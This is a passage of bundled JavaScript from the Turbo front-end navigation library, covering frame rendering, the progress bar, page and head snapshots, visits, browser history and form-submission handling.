      await Bardo.preservingPermanentElements(this, this.permanentElementMap, callback);
    }
    focusFirstAutofocusableElement() {
      const element = this.connectedSnapshot.firstAutofocusableElement;
      if (element) {
        element.focus();
      }
    }
    // Bardo delegate
    enteringBardo(currentPermanentElement) {
      if (this.#activeElement)
        return;
      if (currentPermanentElement.contains(this.currentSnapshot.activeElement)) {
        this.#activeElement = this.currentSnapshot.activeElement;
      }
    }
    leavingBardo(currentPermanentElement) {
      if (currentPermanentElement.contains(this.#activeElement) && this.#activeElement instanceof HTMLElement) {
        this.#activeElement.focus();
        this.#activeElement = null;
      }
    }
    get connectedSnapshot() {
      return this.newSnapshot.isConnected ? this.newSnapshot : this.currentSnapshot;
    }
    get currentElement() {
      return this.currentSnapshot.element;
    }
    get newElement() {
      return this.newSnapshot.element;
    }
    get permanentElementMap() {
      return this.currentSnapshot.getPermanentElementMapForSnapshot(this.newSnapshot);
    }
    get renderMethod() {
      return "replace";
    }
  };
  var FrameRenderer = class extends Renderer {
    static renderElement(currentElement, newElement) {
      const destinationRange = document.createRange();
      destinationRange.selectNodeContents(currentElement);
      destinationRange.deleteContents();
      const frameElement = newElement;
      const sourceRange = frameElement.ownerDocument?.createRange();
      if (sourceRange) {
        sourceRange.selectNodeContents(frameElement);
        currentElement.appendChild(sourceRange.extractContents());
      }
    }
    constructor(delegate, currentSnapshot, newSnapshot, renderElement, isPreview, willRender = true) {
      super(currentSnapshot, newSnapshot, renderElement, isPreview, willRender);
      this.delegate = delegate;
    }
    get shouldRender() {
      return true;
    }
    async render() {
      await nextRepaint();
      this.preservingPermanentElements(() => {
        this.loadFrameElement();
      });
      this.scrollFrameIntoView();
      await nextRepaint();
      this.focusFirstAutofocusableElement();
      await nextRepaint();
      this.activateScriptElements();
    }
    loadFrameElement() {
      this.delegate.willRenderFrame(this.currentElement, this.newElement);
      this.renderElement(this.currentElement, this.newElement);
    }
    scrollFrameIntoView() {
      if (this.currentElement.autoscroll || this.newElement.autoscroll) {
        const element = this.currentElement.firstElementChild;
        const block = readScrollLogicalPosition(this.currentElement.getAttribute("data-autoscroll-block"), "end");
        const behavior = readScrollBehavior(this.currentElement.getAttribute("data-autoscroll-behavior"), "auto");
        if (element) {
          element.scrollIntoView({ block, behavior });
          return true;
        }
      }
      return false;
    }
    activateScriptElements() {
      for (const inertScriptElement of this.newScriptElements) {
        const activatedScriptElement = activateScriptElement(inertScriptElement);
        inertScriptElement.replaceWith(activatedScriptElement);
      }
    }
    get newScriptElements() {
      return this.currentElement.querySelectorAll("script");
    }
  };
  function readScrollLogicalPosition(value, defaultValue) {
    if (value == "end" || value == "start" || value == "center" || value == "nearest") {
      return value;
    } else {
      return defaultValue;
    }
  }
  function readScrollBehavior(value, defaultValue) {
    if (value == "auto" || value == "smooth") {
      return value;
    } else {
      return defaultValue;
    }
  }
  var ProgressBar = class _ProgressBar {
    static animationDuration = 300;
    /*ms*/
    static get defaultCSS() {
      return unindent`
      .turbo-progress-bar {
        position: fixed;
        display: block;
        top: 0;
        left: 0;
        height: 3px;
        background: #0076ff;
        z-index: 2147483647;
        transition:
          width ${_ProgressBar.animationDuration}ms ease-out,
          opacity ${_ProgressBar.animationDuration / 2}ms ${_ProgressBar.animationDuration / 2}ms ease-in;
        transform: translate3d(0, 0, 0);
      }
    `;
    }
    hiding = false;
    value = 0;
    visible = false;
    constructor() {
      this.stylesheetElement = this.createStylesheetElement();
      this.progressElement = this.createProgressElement();
      this.installStylesheetElement();
      this.setValue(0);
    }
    show() {
      if (!this.visible) {
        this.visible = true;
        this.installProgressElement();
        this.startTrickling();
      }
    }
    hide() {
      if (this.visible && !this.hiding) {
        this.hiding = true;
        this.fadeProgressElement(() => {
          this.uninstallProgressElement();
          this.stopTrickling();
          this.visible = false;
          this.hiding = false;
        });
      }
    }
    setValue(value) {
      this.value = value;
      this.refresh();
    }
    // Private
    installStylesheetElement() {
      document.head.insertBefore(this.stylesheetElement, document.head.firstChild);
    }
    installProgressElement() {
      this.progressElement.style.width = "0";
      this.progressElement.style.opacity = "1";
      document.documentElement.insertBefore(this.progressElement, document.body);
      this.refresh();
    }
    fadeProgressElement(callback) {
      this.progressElement.style.opacity = "0";
      setTimeout(callback, _ProgressBar.animationDuration * 1.5);
    }
    uninstallProgressElement() {
      if (this.progressElement.parentNode) {
        document.documentElement.removeChild(this.progressElement);
      }
    }
    startTrickling() {
      if (!this.trickleInterval) {
        this.trickleInterval = window.setInterval(this.trickle, _ProgressBar.animationDuration);
      }
    }
    stopTrickling() {
      window.clearInterval(this.trickleInterval);
      delete this.trickleInterval;
    }
    trickle = () => {
      this.setValue(this.value + Math.random() / 100);
    };
    refresh() {
      requestAnimationFrame(() => {
        this.progressElement.style.width = `${10 + this.value * 90}%`;
      });
    }
    createStylesheetElement() {
      const element = document.createElement("style");
      element.type = "text/css";
      element.textContent = _ProgressBar.defaultCSS;
      if (this.cspNonce) {
        element.nonce = this.cspNonce;
      }
      return element;
    }
    createProgressElement() {
      const element = document.createElement("div");
      element.className = "turbo-progress-bar";
      return element;
    }
    get cspNonce() {
      return getMetaContent("csp-nonce");
    }
  };
  var HeadSnapshot = class extends Snapshot {
    detailsByOuterHTML = this.children.filter((element) => !elementIsNoscript(element)).map((element) => elementWithoutNonce(element)).reduce((result, element) => {
      const { outerHTML } = element;
      const details = outerHTML in result ? result[outerHTML] : {
        type: elementType(element),
        tracked: elementIsTracked(element),
        elements: []
      };
      return {
        ...result,
        [outerHTML]: {
          ...details,
          elements: [...details.elements, element]
        }
      };
    }, {});
    get trackedElementSignature() {
      return Object.keys(this.detailsByOuterHTML).filter((outerHTML) => this.detailsByOuterHTML[outerHTML].tracked).join("");
    }
    getScriptElementsNotInSnapshot(snapshot) {
      return this.getElementsMatchingTypeNotInSnapshot("script", snapshot);
    }
    getStylesheetElementsNotInSnapshot(snapshot) {
      return this.getElementsMatchingTypeNotInSnapshot("stylesheet", snapshot);
    }
    getElementsMatchingTypeNotInSnapshot(matchedType, snapshot) {
      return Object.keys(this.detailsByOuterHTML).filter((outerHTML) => !(outerHTML in snapshot.detailsByOuterHTML)).map((outerHTML) => this.detailsByOuterHTML[outerHTML]).filter(({ type }) => type == matchedType).map(({ elements: [element] }) => element);
    }
    get provisionalElements() {
      return Object.keys(this.detailsByOuterHTML).reduce((result, outerHTML) => {
        const { type, tracked, elements } = this.detailsByOuterHTML[outerHTML];
        if (type == null && !tracked) {
          return [...result, ...elements];
        } else if (elements.length > 1) {
          return [...result, ...elements.slice(1)];
        } else {
          return result;
        }
      }, []);
    }
    getMetaValue(name) {
      const element = this.findMetaElementByName(name);
      return element ? element.getAttribute("content") : null;
    }
    findMetaElementByName(name) {
      return Object.keys(this.detailsByOuterHTML).reduce((result, outerHTML) => {
        const {
          elements: [element]
        } = this.detailsByOuterHTML[outerHTML];
        return elementIsMetaElementWithName(element, name) ? element : result;
      }, void 0 | void 0);
    }
  };
  function elementType(element) {
    if (elementIsScript(element)) {
      return "script";
    } else if (elementIsStylesheet(element)) {
      return "stylesheet";
    }
  }
  function elementIsTracked(element) {
    return element.getAttribute("data-turbo-track") == "reload";
  }
  function elementIsScript(element) {
    const tagName = element.localName;
    return tagName == "script";
  }
  function elementIsNoscript(element) {
    const tagName = element.localName;
    return tagName == "noscript";
  }
  function elementIsStylesheet(element) {
    const tagName = element.localName;
    return tagName == "style" || tagName == "link" && element.getAttribute("rel") == "stylesheet";
  }
  function elementIsMetaElementWithName(element, name) {
    const tagName = element.localName;
    return tagName == "meta" && element.getAttribute("name") == name;
  }
  function elementWithoutNonce(element) {
    if (element.hasAttribute("nonce")) {
      element.setAttribute("nonce", "");
    }
    return element;
  }
  var PageSnapshot = class _PageSnapshot extends Snapshot {
    static fromHTMLString(html = "") {
      return this.fromDocument(parseHTMLDocument(html));
    }
    static fromElement(element) {
      return this.fromDocument(element.ownerDocument);
    }
    static fromDocument({ documentElement, body, head }) {
      return new this(documentElement, body, new HeadSnapshot(head));
    }
    constructor(documentElement, body, headSnapshot) {
      super(body);
      this.documentElement = documentElement;
      this.headSnapshot = headSnapshot;
    }
    clone() {
      const clonedElement = this.element.cloneNode(true);
      const selectElements = this.element.querySelectorAll("select");
      const clonedSelectElements = clonedElement.querySelectorAll("select");
      for (const [index, source] of selectElements.entries()) {
        const clone = clonedSelectElements[index];
        for (const option of clone.selectedOptions)
          option.selected = false;
        for (const option of source.selectedOptions)
          clone.options[option.index].selected = true;
      }
      for (const clonedPasswordInput of clonedElement.querySelectorAll('input[type="password"]')) {
        clonedPasswordInput.value = "";
      }
      return new _PageSnapshot(this.documentElement, clonedElement, this.headSnapshot);
    }
    get lang() {
      return this.documentElement.getAttribute("lang");
    }
    get headElement() {
      return this.headSnapshot.element;
    }
    get rootLocation() {
      const root2 = this.getSetting("root") ?? "/";
      return expandURL(root2);
    }
    get cacheControlValue() {
      return this.getSetting("cache-control");
    }
    get isPreviewable() {
      return this.cacheControlValue != "no-preview";
    }
    get isCacheable() {
      return this.cacheControlValue != "no-cache";
    }
    get isVisitable() {
      return this.getSetting("visit-control") != "reload";
    }
    get prefersViewTransitions() {
      return this.headSnapshot.getMetaValue("view-transition") === "same-origin";
    }
    get shouldMorphPage() {
      return this.getSetting("refresh-method") === "morph";
    }
    get shouldPreserveScrollPosition() {
      return this.getSetting("refresh-scroll") === "preserve";
    }
    // Private
    getSetting(name) {
      return this.headSnapshot.getMetaValue(`turbo-${name}`);
    }
  };
  var ViewTransitioner = class {
    #viewTransitionStarted = false;
    #lastOperation = Promise.resolve();
    renderChange(useViewTransition, render) {
      if (useViewTransition && this.viewTransitionsAvailable && !this.#viewTransitionStarted) {
        this.#viewTransitionStarted = true;
        this.#lastOperation = this.#lastOperation.then(async () => {
          await document.startViewTransition(render).finished;
        });
      } else {
        this.#lastOperation = this.#lastOperation.then(render);
      }
      return this.#lastOperation;
    }
    get viewTransitionsAvailable() {
      return document.startViewTransition;
    }
  };
  var defaultOptions = {
    action: "advance",
    historyChanged: false,
    visitCachedSnapshot: () => {
    },
    willRender: true,
    updateHistory: true,
    shouldCacheSnapshot: true,
    acceptsStreamResponse: false
  };
  var TimingMetric = {
    visitStart: "visitStart",
    requestStart: "requestStart",
    requestEnd: "requestEnd",
    visitEnd: "visitEnd"
  };
  var VisitState = {
    initialized: "initialized",
    started: "started",
    canceled: "canceled",
    failed: "failed",
    completed: "completed"
  };
  var SystemStatusCode = {
    networkFailure: 0,
    timeoutFailure: -1,
    contentTypeMismatch: -2
  };
  var Direction = {
    advance: "forward",
    restore: "back",
    replace: "none"
  };
  var Visit = class {
    identifier = uuid();
    // Required by turbo-ios
    timingMetrics = {};
    followedRedirect = false;
    historyChanged = false;
    scrolled = false;
    shouldCacheSnapshot = true;
    acceptsStreamResponse = false;
    snapshotCached = false;
    state = VisitState.initialized;
    viewTransitioner = new ViewTransitioner();
    constructor(delegate, location2, restorationIdentifier, options = {}) {
      this.delegate = delegate;
      this.location = location2;
      this.restorationIdentifier = restorationIdentifier || uuid();
      const {
        action,
        historyChanged,
        referrer,
        snapshot,
        snapshotHTML,
        response,
        visitCachedSnapshot,
        willRender,
        updateHistory,
        shouldCacheSnapshot,
        acceptsStreamResponse,
        direction
      } = {
        ...defaultOptions,
        ...options
      };
      this.action = action;
      this.historyChanged = historyChanged;
      this.referrer = referrer;
      this.snapshot = snapshot;
      this.snapshotHTML = snapshotHTML;
      this.response = response;
      this.isSamePage = this.delegate.locationWithActionIsSamePage(this.location, this.action);
      this.visitCachedSnapshot = visitCachedSnapshot;
      this.willRender = willRender;
      this.updateHistory = updateHistory;
      this.scrolled = !willRender;
      this.shouldCacheSnapshot = shouldCacheSnapshot;
      this.acceptsStreamResponse = acceptsStreamResponse;
      this.direction = direction || Direction[action];
    }
    get adapter() {
      return this.delegate.adapter;
    }
    get view() {
      return this.delegate.view;
    }
    get history() {
      return this.delegate.history;
    }
    get restorationData() {
      return this.history.getRestorationDataForIdentifier(this.restorationIdentifier);
    }
    get silent() {
      return this.isSamePage;
    }
    start() {
      if (this.state == VisitState.initialized) {
        this.recordTimingMetric(TimingMetric.visitStart);
        this.state = VisitState.started;
        this.adapter.visitStarted(this);
        this.delegate.visitStarted(this);
      }
    }
    cancel() {
      if (this.state == VisitState.started) {
        if (this.request) {
          this.request.cancel();
        }
        this.cancelRender();
        this.state = VisitState.canceled;
      }
    }
    complete() {
      if (this.state == VisitState.started) {
        this.recordTimingMetric(TimingMetric.visitEnd);
        this.state = VisitState.completed;
        this.followRedirect();
        if (!this.followedRedirect) {
          this.adapter.visitCompleted(this);
          this.delegate.visitCompleted(this);
        }
      }
    }
    fail() {
      if (this.state == VisitState.started) {
        this.state = VisitState.failed;
        this.adapter.visitFailed(this);
        this.delegate.visitCompleted(this);
      }
    }
    changeHistory() {
      if (!this.historyChanged && this.updateHistory) {
        const actionForHistory = this.location.href === this.referrer?.href ? "replace" : this.action;
        const method = getHistoryMethodForAction(actionForHistory);
        this.history.update(method, this.location, this.restorationIdentifier);
        this.historyChanged = true;
      }
    }
    issueRequest() {
      if (this.hasPreloadedResponse()) {
        this.simulateRequest();
      } else if (this.shouldIssueRequest() && !this.request) {
        this.request = new FetchRequest(this, FetchMethod.get, this.location);
        this.request.perform();
      }
    }
    simulateRequest() {
      if (this.response) {
        this.startRequest();
        this.recordResponse();
        this.finishRequest();
      }
    }
    startRequest() {
      this.recordTimingMetric(TimingMetric.requestStart);
      this.adapter.visitRequestStarted(this);
    }
    recordResponse(response = this.response) {
      this.response = response;
      if (response) {
        const { statusCode } = response;
        if (isSuccessful(statusCode)) {
          this.adapter.visitRequestCompleted(this);
        } else {
          this.adapter.visitRequestFailedWithStatusCode(this, statusCode);
        }
      }
    }
    finishRequest() {
      this.recordTimingMetric(TimingMetric.requestEnd);
      this.adapter.visitRequestFinished(this);
    }
    loadResponse() {
      if (this.response) {
        const { statusCode, responseHTML } = this.response;
        this.render(async () => {
          if (this.shouldCacheSnapshot)
            this.cacheSnapshot();
          if (this.view.renderPromise)
            await this.view.renderPromise;
          if (isSuccessful(statusCode) && responseHTML != null) {
            const snapshot = PageSnapshot.fromHTMLString(responseHTML);
            await this.renderPageSnapshot(snapshot, false);
            this.adapter.visitRendered(this);
            this.complete();
          } else {
            await this.view.renderError(PageSnapshot.fromHTMLString(responseHTML), this);
            this.adapter.visitRendered(this);
            this.fail();
          }
        });
      }
    }
    getCachedSnapshot() {
      const snapshot = this.view.getCachedSnapshotForLocation(this.location) || this.getPreloadedSnapshot();
      if (snapshot && (!getAnchor(this.location) || snapshot.hasAnchor(getAnchor(this.location)))) {
        if (this.action == "restore" || snapshot.isPreviewable) {
          return snapshot;
        }
      }
    }
    getPreloadedSnapshot() {
      if (this.snapshotHTML) {
        return PageSnapshot.fromHTMLString(this.snapshotHTML);
      }
    }
    hasCachedSnapshot() {
      return this.getCachedSnapshot() != null;
    }
    loadCachedSnapshot() {
      const snapshot = this.getCachedSnapshot();
      if (snapshot) {
        const isPreview = this.shouldIssueRequest();
        this.render(async () => {
          this.cacheSnapshot();
          if (this.isSamePage) {
            this.adapter.visitRendered(this);
          } else {
            if (this.view.renderPromise)
              await this.view.renderPromise;
            await this.renderPageSnapshot(snapshot, isPreview);
            this.adapter.visitRendered(this);
            if (!isPreview) {
              this.complete();
            }
          }
        });
      }
    }
    followRedirect() {
      if (this.redirectedToLocation && !this.followedRedirect && this.response?.redirected) {
        this.adapter.visitProposedToLocation(this.redirectedToLocation, {
          action: "replace",
          response: this.response,
          shouldCacheSnapshot: false,
          willRender: false
        });
        this.followedRedirect = true;
      }
    }
    goToSamePageAnchor() {
      if (this.isSamePage) {
        this.render(async () => {
          this.cacheSnapshot();
          this.performScroll();
          this.changeHistory();
          this.adapter.visitRendered(this);
        });
      }
    }
    // Fetch request delegate
    prepareRequest(request) {
      if (this.acceptsStreamResponse) {
        request.acceptResponseType(StreamMessage.contentType);
      }
    }
    requestStarted() {
      this.startRequest();
    }
    requestPreventedHandlingResponse(_request, _response) {
    }
    async requestSucceededWithResponse(request, response) {
      const responseHTML = await response.responseHTML;
      const { redirected, statusCode } = response;
      if (responseHTML == void 0) {
        this.recordResponse({
          statusCode: SystemStatusCode.contentTypeMismatch,
          redirected
        });
      } else {
        this.redirectedToLocation = response.redirected ? response.location : void 0;
        this.recordResponse({ statusCode, responseHTML, redirected });
      }
    }
    async requestFailedWithResponse(request, response) {
      const responseHTML = await response.responseHTML;
      const { redirected, statusCode } = response;
      if (responseHTML == void 0) {
        this.recordResponse({
          statusCode: SystemStatusCode.contentTypeMismatch,
          redirected
        });
      } else {
        this.recordResponse({ statusCode, responseHTML, redirected });
      }
    }
    requestErrored(_request, _error) {
      this.recordResponse({
        statusCode: SystemStatusCode.networkFailure,
        redirected: false
      });
    }
    requestFinished() {
      this.finishRequest();
    }
    // Scrolling
    performScroll() {
      if (!this.scrolled && !this.view.forceReloaded && !this.view.shouldPreserveScrollPosition(this)) {
        if (this.action == "restore") {
          this.scrollToRestoredPosition() || this.scrollToAnchor() || this.view.scrollToTop();
        } else {
          this.scrollToAnchor() || this.view.scrollToTop();
        }
        if (this.isSamePage) {
          this.delegate.visitScrolledToSamePageLocation(this.view.lastRenderedLocation, this.location);
        }
        this.scrolled = true;
      }
    }
    scrollToRestoredPosition() {
      const { scrollPosition } = this.restorationData;
      if (scrollPosition) {
        this.view.scrollToPosition(scrollPosition);
        return true;
      }
    }
    scrollToAnchor() {
      const anchor = getAnchor(this.location);
      if (anchor != null) {
        this.view.scrollToAnchor(anchor);
        return true;
      }
    }
    // Instrumentation
    recordTimingMetric(metric) {
      this.timingMetrics[metric] = (/* @__PURE__ */ new Date()).getTime();
    }
    getTimingMetrics() {
      return { ...this.timingMetrics };
    }
    // Private
    getHistoryMethodForAction(action) {
      switch (action) {
        case "replace":
          return history.replaceState;
        case "advance":
        case "restore":
          return history.pushState;
      }
    }
    hasPreloadedResponse() {
      return typeof this.response == "object";
    }
    shouldIssueRequest() {
      if (this.isSamePage) {
        return false;
      } else if (this.action == "restore") {
        return !this.hasCachedSnapshot();
      } else {
        return this.willRender;
      }
    }
    cacheSnapshot() {
      if (!this.snapshotCached) {
        this.view.cacheSnapshot(this.snapshot).then((snapshot) => snapshot && this.visitCachedSnapshot(snapshot));
        this.snapshotCached = true;
      }
    }
    async render(callback) {
      this.cancelRender();
      this.frame = await nextRepaint();
      await callback();
      delete this.frame;
    }
    async renderPageSnapshot(snapshot, isPreview) {
      await this.viewTransitioner.renderChange(this.view.shouldTransitionTo(snapshot), async () => {
        await this.view.renderPage(snapshot, isPreview, this.willRender, this);
        this.performScroll();
      });
    }
    cancelRender() {
      if (this.frame) {
        cancelAnimationFrame(this.frame);
        delete this.frame;
      }
    }
  };
  function isSuccessful(statusCode) {
    return statusCode >= 200 && statusCode < 300;
  }
  var BrowserAdapter = class {
    progressBar = new ProgressBar();
    constructor(session2) {
      this.session = session2;
    }
    visitProposedToLocation(location2, options) {
      if (locationIsVisitable(location2, this.navigator.rootLocation)) {
        this.navigator.startVisit(location2, options?.restorationIdentifier || uuid(), options);
      } else {
        window.location.href = location2.toString();
      }
    }
    visitStarted(visit2) {
      this.location = visit2.location;
      visit2.loadCachedSnapshot();
      visit2.issueRequest();
      visit2.goToSamePageAnchor();
    }
    visitRequestStarted(visit2) {
      this.progressBar.setValue(0);
      if (visit2.hasCachedSnapshot() || visit2.action != "restore") {
        this.showVisitProgressBarAfterDelay();
      } else {
        this.showProgressBar();
      }
    }
    visitRequestCompleted(visit2) {
      visit2.loadResponse();
    }
    visitRequestFailedWithStatusCode(visit2, statusCode) {
      switch (statusCode) {
        case SystemStatusCode.networkFailure:
        case SystemStatusCode.timeoutFailure:
        case SystemStatusCode.contentTypeMismatch:
          return this.reload({
            reason: "request_failed",
            context: {
              statusCode
            }
          });
        default:
          return visit2.loadResponse();
      }
    }
    visitRequestFinished(_visit) {
    }
    visitCompleted(_visit) {
      this.progressBar.setValue(1);
      this.hideVisitProgressBar();
    }
    pageInvalidated(reason) {
      this.reload(reason);
    }
    visitFailed(_visit) {
      this.progressBar.setValue(1);
      this.hideVisitProgressBar();
    }
    visitRendered(_visit) {
    }
    // Form Submission Delegate
    formSubmissionStarted(_formSubmission) {
      this.progressBar.setValue(0);
      this.showFormProgressBarAfterDelay();
    }
    formSubmissionFinished(_formSubmission) {
      this.progressBar.setValue(1);
      this.hideFormProgressBar();
    }
    // Private
    showVisitProgressBarAfterDelay() {
      this.visitProgressBarTimeout = window.setTimeout(this.showProgressBar, this.session.progressBarDelay);
    }
    hideVisitProgressBar() {
      this.progressBar.hide();
      if (this.visitProgressBarTimeout != null) {
        window.clearTimeout(this.visitProgressBarTimeout);
        delete this.visitProgressBarTimeout;
      }
    }
    showFormProgressBarAfterDelay() {
      if (this.formProgressBarTimeout == null) {
        this.formProgressBarTimeout = window.setTimeout(this.showProgressBar, this.session.progressBarDelay);
      }
    }
    hideFormProgressBar() {
      this.progressBar.hide();
      if (this.formProgressBarTimeout != null) {
        window.clearTimeout(this.formProgressBarTimeout);
        delete this.formProgressBarTimeout;
      }
    }
    showProgressBar = () => {
      this.progressBar.show();
    };
    reload(reason) {
      dispatch("turbo:reload", { detail: reason });
      window.location.href = this.location?.toString() || window.location.href;
    }
    get navigator() {
      return this.session.navigator;
    }
  };
  var CacheObserver = class {
    selector = "[data-turbo-temporary]";
    deprecatedSelector = "[data-turbo-cache=false]";
    started = false;
    start() {
      if (!this.started) {
        this.started = true;
        addEventListener("turbo:before-cache", this.removeTemporaryElements, false);
      }
    }
    stop() {
      if (this.started) {
        this.started = false;
        removeEventListener("turbo:before-cache", this.removeTemporaryElements, false);
      }
    }
    removeTemporaryElements = (_event) => {
      for (const element of this.temporaryElements) {
        element.remove();
      }
    };
    get temporaryElements() {
      return [...document.querySelectorAll(this.selector), ...this.temporaryElementsWithDeprecation];
    }
    get temporaryElementsWithDeprecation() {
      const elements = document.querySelectorAll(this.deprecatedSelector);
      if (elements.length) {
        console.warn(
          `The ${this.deprecatedSelector} selector is deprecated and will be removed in a future version. Use ${this.selector} instead.`
        );
      }
      return [...elements];
    }
  };
  var FrameRedirector = class {
    constructor(session2, element) {
      this.session = session2;
      this.element = element;
      this.linkInterceptor = new LinkInterceptor(this, element);
      this.formSubmitObserver = new FormSubmitObserver(this, element);
    }
    start() {
      this.linkInterceptor.start();
      this.formSubmitObserver.start();
    }
    stop() {
      this.linkInterceptor.stop();
      this.formSubmitObserver.stop();
    }
    // Link interceptor delegate
    shouldInterceptLinkClick(element, _location, _event) {
      return this.#shouldRedirect(element);
    }
    linkClickIntercepted(element, url, event) {
      const frame = this.#findFrameElement(element);
      if (frame) {
        frame.delegate.linkClickIntercepted(element, url, event);
      }
    }
    // Form submit observer delegate
    willSubmitForm(element, submitter) {
      return element.closest("turbo-frame") == null && this.#shouldSubmit(element, submitter) && this.#shouldRedirect(element, submitter);
    }
    formSubmitted(element, submitter) {
      const frame = this.#findFrameElement(element, submitter);
      if (frame) {
        frame.delegate.formSubmitted(element, submitter);
      }
    }
    #shouldSubmit(form, submitter) {
      const action = getAction$1(form, submitter);
      const meta = this.element.ownerDocument.querySelector(`meta[name="turbo-root"]`);
      const rootLocation = expandURL(meta?.content ?? "/");
      return this.#shouldRedirect(form, submitter) && locationIsVisitable(action, rootLocation);
    }
    #shouldRedirect(element, submitter) {
      const isNavigatable = element instanceof HTMLFormElement ? this.session.submissionIsNavigatable(element, submitter) : this.session.elementIsNavigatable(element);
      if (isNavigatable) {
        const frame = this.#findFrameElement(element, submitter);
        return frame ? frame != element.closest("turbo-frame") : false;
      } else {
        return false;
      }
    }
    #findFrameElement(element, submitter) {
      const id = submitter?.getAttribute("data-turbo-frame") || element.getAttribute("data-turbo-frame");
      if (id && id != "_top") {
        const frame = this.element.querySelector(`#${id}:not([disabled])`);
        if (frame instanceof FrameElement) {
          return frame;
        }
      }
    }
  };
  var History = class {
    location;
    restorationIdentifier = uuid();
    restorationData = {};
    started = false;
    pageLoaded = false;
    currentIndex = 0;
    constructor(delegate) {
      this.delegate = delegate;
    }
    start() {
      if (!this.started) {
        addEventListener("popstate", this.onPopState, false);
        addEventListener("load", this.onPageLoad, false);
        this.currentIndex = history.state?.turbo?.restorationIndex || 0;
        this.started = true;
        this.replace(new URL(window.location.href));
      }
    }
    stop() {
      if (this.started) {
        removeEventListener("popstate", this.onPopState, false);
        removeEventListener("load", this.onPageLoad, false);
        this.started = false;
      }
    }
    push(location2, restorationIdentifier) {
      this.update(history.pushState, location2, restorationIdentifier);
    }
    replace(location2, restorationIdentifier) {
      this.update(history.replaceState, location2, restorationIdentifier);
    }
    update(method, location2, restorationIdentifier = uuid()) {
      if (method === history.pushState)
        ++this.currentIndex;
      const state = { turbo: { restorationIdentifier, restorationIndex: this.currentIndex } };
      method.call(history, state, "", location2.href);
      this.location = location2;
      this.restorationIdentifier = restorationIdentifier;
    }
    // Restoration data
    getRestorationDataForIdentifier(restorationIdentifier) {
      return this.restorationData[restorationIdentifier] || {};
    }
    updateRestorationData(additionalData) {
      const { restorationIdentifier } = this;
      const restorationData = this.restorationData[restorationIdentifier];
      this.restorationData[restorationIdentifier] = {
        ...restorationData,
        ...additionalData
      };
    }
    // Scroll restoration
    assumeControlOfScrollRestoration() {
      if (!this.previousScrollRestoration) {
        this.previousScrollRestoration = history.scrollRestoration ?? "auto";
        history.scrollRestoration = "manual";
      }
    }
    relinquishControlOfScrollRestoration() {
      if (this.previousScrollRestoration) {
        history.scrollRestoration = this.previousScrollRestoration;
        delete this.previousScrollRestoration;
      }
    }
    // Event handlers
    onPopState = (event) => {
      if (this.shouldHandlePopState()) {
        const { turbo } = event.state || {};
        if (turbo) {
          this.location = new URL(window.location.href);
          const { restorationIdentifier, restorationIndex } = turbo;
          this.restorationIdentifier = restorationIdentifier;
          const direction = restorationIndex > this.currentIndex ? "forward" : "back";
          this.delegate.historyPoppedToLocationWithRestorationIdentifierAndDirection(this.location, restorationIdentifier, direction);
          this.currentIndex = restorationIndex;
        }
      }
    };
    onPageLoad = async (_event) => {
      await nextMicrotask();
      this.pageLoaded = true;
    };
    // Private
    shouldHandlePopState() {
      return this.pageIsLoaded();
    }
    pageIsLoaded() {
      return this.pageLoaded || document.readyState == "complete";
    }
  };
  var Navigator = class {
    constructor(delegate) {
      this.delegate = delegate;
    }
    proposeVisit(location2, options = {}) {
      if (this.delegate.allowsVisitingLocationWithAction(location2, options.action)) {
        this.delegate.visitProposedToLocation(location2, options);
      }
    }
    startVisit(locatable, restorationIdentifier, options = {}) {
      this.stop();
      this.currentVisit = new Visit(this, expandURL(locatable), restorationIdentifier, {
        referrer: this.location,
        ...options
      });
      this.currentVisit.start();
    }
    submitForm(form, submitter) {
      this.stop();
      this.formSubmission = new FormSubmission(this, form, submitter, true);
      this.formSubmission.start();
    }
    stop() {
      if (this.formSubmission) {
        this.formSubmission.stop();
        delete this.formSubmission;
      }
      if (this.currentVisit) {
        this.currentVisit.cancel();
        delete this.currentVisit;
      }
    }
    get adapter() {
      return this.delegate.adapter;
    }
    get view() {
      return this.delegate.view;
    }
    get rootLocation() {
      return this.view.snapshot.rootLocation;
    }
    get history() {
      return this.delegate.history;
    }
    // Form submission delegate
    formSubmissionStarted(formSubmission) {
      if (typeof this.adapter.formSubmissionStarted === "function") {
        this.adapter.formSubmissionStarted(formSubmission);
      }
    }
    async formSubmissionSucceededWithResponse(formSubmission, fetchResponse) {
      if (formSubmission == this.formSubmission) {
        const responseHTML = await fetchResponse.responseHTML;
        if (responseHTML) {
          const shouldCacheSnapshot = formSubmission.isSafe;
          if (!shouldCacheSnapshot) {
            this.view.clearSnapshotCache();
          }
          const { statusCode, redirected } = fetchResponse;
          const action = this.#getActionForFormSubmission(formSubmission, fetchResponse);
          const visitOptions = {
            action,
            shouldCacheSnapshot,
            response: { statusCode, responseHTML, redirected }
          };
          this.proposeVisit(fetchResponse.location, visitOptions);
        }
      }
    }
    async formSubmissionFailedWithResponse(formSubmission, fetchResponse) {
      const responseHTML = await fetchResponse.responseHTML;
      if (responseHTML) {
        const snapshot = PageSnapshot.fromHTMLString(responseHTML);
        if (fetchResponse.serverError) {
          await this.view.renderError(snapshot, this.currentVisit);
        } else {
          await this.view.renderPage(snapshot, false, true, this.currentVisit);
        }
        if (!snapshot.shouldPreserveScrollPosition) {
          this.view.scrollToTop();
        }
        this.view.clearSnapshotCache();
      }
    }
    formSubmissionErrored(formSubmission, error2) {
      console.error(error2);
    }
    formSubmissionFinished(formSubmission) {
      if (typeof this.adapter.formSubmissionFinished === "function") {
        this.adapter.formSubmissionFinished(formSubmission);
      }
    }
    // Visit delegate
    visitStarted(visit2) {
      this.delegate.visitStarted(visit2);
    }
    visitCompleted(visit2) {
      this.delegate.visitCompleted(visit2);
    }
    locationWithActionIsSamePage(location2, action) {
      const anchor = getAnchor(location2);
      const currentAnchor = getAnchor(this.view.lastRenderedLocation);
      const isRestorationToTop = action === "restore" && typeof anchor === "undefined";
      return action !== "replace" && getRequestURL(location2) === getRequestURL(this.view.lastRenderedLocation) && (isRestorationToTop || anchor != null && anchor !== currentAnchor);
    }
    visitScrolledToSamePageLocation(oldURL, newURL) {
      this.delegate.visitScrolledToSamePageLocation(oldURL, newURL);
    }
    // Visits
    get location() {
      return this.history.location;
    }
    get restorationIdentifier() {
      return this.history.restorationIdentifier;
    }
    #getActionForFormSubmission(formSubmission, fetchResponse) {
      const { submitter, formElement } = formSubmission;
      return getVisitAction(submitter, formElement) || this.#getDefaultAction(fetchResponse);
    }
    #getDefaultAction(fetchResponse) {
      const sameLocationRedirect = fetchResponse.redirected && fetchResponse.location.href === this.location?.href;
      return sameLocationRedirect ? "replace" : "advance";
    }
  };
  var PageStage = {
